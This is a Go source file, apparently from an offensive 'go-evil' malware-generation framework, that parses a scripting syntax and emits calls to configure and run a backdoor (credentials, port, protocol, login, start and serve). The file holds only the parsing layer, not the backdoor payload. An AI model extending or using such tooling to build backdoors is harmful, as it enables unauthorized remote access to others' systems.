package backdoor

import (
	"regexp"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN      = "(backdoor)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                 // Grabs the value being passed to the function
	EXTRACT_FUNCTION       = "(backdoor)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
	result := regex.FindAllStringSubmatch(new_line, -1)
	var value string
	if len(result) > 0 {
		value = result[0][1]
	} else {
		value = "NULL"
	}
	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result = regex.FindAllStringSubmatch(new_line, -1)

	if len(result) > 0 { // There is a subdomain to extract
		subdomain := result[0][2]
		function := result[0][3]

		switch subdomain {
		case "set":
			switch function {
			case "hash":
				mal.AddContent("back.Set_hash(\"" + value + "\")")
			case "user":
				mal.AddContent("back.Set_username(\"" + value + "\")")
			case "password":
				mal.AddContent("back.Set_password(\"" + value + "\")")
			case "port":
				mal.AddContent("back.Set_port(\"" + value + "\")")
			case "protocol":
				mal.AddContent("back.Set_protocol(\"" + value + "\")")
			case "welcome":
				mal.AddContent("back.Set_welcome_msg(\"" + value + "\")")
			case "read_size":
				mal.AddContent("back.Set_read_size(\"" + value + "\")")
			default:
				function_error(function)
			}
		case "login":
			switch function {
			case "enable":
				mal.AddContent("back.Enable_login()")
			case "disable":
				mal.AddContent("back.Disable_login()")
			default:
				function_error(function)
			}
		default:
			subdomain_error(subdomain)
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			function := result[0][2]
			switch function {
			case "start":
				mal.AddContent("back.Start()")
			case "serve":
				mal.AddContent("back.Serve()")
			case "stop":
				mal.AddContent("back.Close()")
			default:
				function_error(function)
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain '"+subdomain+"'", "backdoor.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function '"+function+"'", "backdoor.Parse()")
}
